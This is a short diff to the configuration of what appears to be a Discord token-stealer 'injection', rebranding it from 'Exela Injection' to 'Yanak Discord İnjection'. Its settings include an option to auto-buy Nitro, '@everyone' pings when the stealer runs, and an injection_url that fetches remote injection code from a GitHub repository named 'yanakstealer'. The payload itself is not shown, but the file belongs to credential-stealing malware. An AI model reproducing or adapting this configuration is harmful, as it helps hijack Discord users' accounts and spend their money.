@@ -11,8 +11,8 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone', 
-  embed_name: 'Exela Injection', 
-  embed_icon: 'https://i.hizliresim.com/6t31tw2.jpg', 
+  embed_name: 'Yanak Discord İnjection 🤡', 
+  embed_icon: 'https://cdn.discordapp.com/attachments/1156215347943313428/1194938085222383646/yanak.png?ex=65b22bd0&is=659fb6d0&hm=76d862f44671beb30ddda8d364996740491420b6f36879e63292d2b117505fa6&', 
   embed_color: 0, 
   injection_url: 'https://raw.githubusercontent.com/eyupware/yanakstealer/injection.js', 
 
